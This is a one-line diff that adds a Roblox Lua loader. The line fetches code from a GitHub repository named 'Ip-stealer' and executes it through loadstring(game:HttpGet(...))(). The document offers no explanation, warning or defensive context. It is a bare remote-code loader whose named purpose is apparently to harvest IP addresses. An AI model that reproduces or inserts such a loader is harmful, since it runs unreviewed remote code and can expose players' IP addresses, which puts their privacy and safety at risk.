@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wehadong3-droid/Ip-stealer/refs/heads/main/Source%20code"))()
